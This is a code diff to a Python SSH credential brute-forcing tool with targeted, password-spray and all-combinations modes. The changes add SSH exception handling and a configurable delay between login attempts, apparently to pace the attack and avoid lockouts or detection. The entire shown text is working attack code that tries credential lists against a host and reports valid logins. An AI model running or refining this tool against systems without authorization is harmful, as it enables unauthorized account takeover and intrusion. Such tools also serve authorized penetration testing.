@@ -13,9 +13,11 @@ def try_ssh_login(host, port, username, password):
         return True # Login successful
     except paramiko.AuthenticationException:
         return False # Login failed
+    except paramiko.ssh_exception.SSHException as e:
+        print(f"SSH exception: {e}")
+        return False
     except Exception as e:
         print(f" Connection error: {e}")
-        return False
     
 # Handles throttling (after every x attempts)
 def throttle_option(attempts, limit, sleep_time):
@@ -24,7 +26,7 @@ def throttle_option(attempts, limit, sleep_time):
         time.sleep(sleep_time)
     
 # Mode: targeted (1 user, many passwords)
-def brute_single_user(host, port, username, password_file, limit=None, sleep_time=None):
+def brute_single_user(host, port, username, password_file, limit=None, sleep_time=None, delay=0.5):
     attempts = 0
     with open(password_file, "r") as f:
         for line in f:
@@ -36,9 +38,10 @@ def brute_single_user(host, port, username, password_file, limit=None, sleep_tim
             else:
                 print(f"Failed: {username}:{password}")
                 throttle_option(attempts, limit, sleep_time)
+                time.sleep(delay)
 
 # Mode: spray (multiple users, 1 password)
-def spray_usernames(host, port, usernames_file, password, limit=None, sleep_time=None):
+def spray_usernames(host, port, usernames_file, password, limit=None, sleep_time=None, delay=0.5):
     attempts = 0
     with open(usernames_file, "r") as f:
         for line in f:
@@ -50,9 +53,10 @@ def spray_usernames(host, port, usernames_file, password, limit=None, sleep_time
             else:
                 print(f"Failed: {username}:{password}")
                 throttle_option(attempts, limit, sleep_time)
+                time.sleep(delay)
 
 # Mode: broadside (multiple users, multiple passwords)
-def brute_user_pass(host, port, usernames_file, passwords_file, limit=None, sleep_time=None):
+def brute_user_pass(host, port, usernames_file, passwords_file, limit=None, sleep_time=None, delay=0.5):
     attempts = 0
     with open(usernames_file, "r") as uf:
         users = [line.strip() for line in uf if line.strip()]
@@ -68,6 +72,7 @@ def brute_user_pass(host, port, usernames_file, passwords_file, limit=None, slee
             else:
                 print(f"Failed: {user}:{password}")
                 throttle_option(attempts, limit, sleep_time)
+                time.sleep(delay)
 
 # argument parsing and mode routing
 
@@ -87,6 +92,7 @@ def main():
     # sleep/limit input arguments
     parser.add_argument("--limit", type=int, help="Number of attempts before waiting")
     parser.add_argument("--sleep", type=int, help="Seconds to sleep between attempt batches")
+    parser.add_argument("--delay", type=float, default=0.5, help="Delay between each attempt (default: 0.5s)")
 
     args = parser.parse_args()
 
@@ -94,19 +100,19 @@ def main():
         if not args.username or not args.passfile:
             print("'targeted' mode requires --username and --passfile")
             sys.exit(1)
-        brute_single_user(args.host, args.port, args.username, args.passfile, args.limit, args.sleep)
+        brute_single_user(args.host, args.port, args.username, args.passfile, args.limit, args.sleep, args.delay)
 
     elif args.mode == "spray":
         if not args.userfile or not args.password:
             print("'spray' mode requires --userfile and --password")
             sys.exit(1)
-        spray_usernames(args.host, args.port, args.userfile, args.password, args.limit, args.sleep)
+        spray_usernames(args.host, args.port, args.userfile, args.password, args.limit, args.sleep, args.delay)
 
     elif args.mode == "broadside":
         if not args.userfile or not args.passfile:
             print("'full' mode requires --userfile and --passfile")
             sys.exit(1)
-        brute_user_pass(args.host, args.port, args.userfile, args.passfile, args.limit, args.sleep)
+        brute_user_pass(args.host, args.port, args.userfile, args.passfile, args.limit, args.sleep, args.delay)
 
 if __name__ == "__main__":
     main()
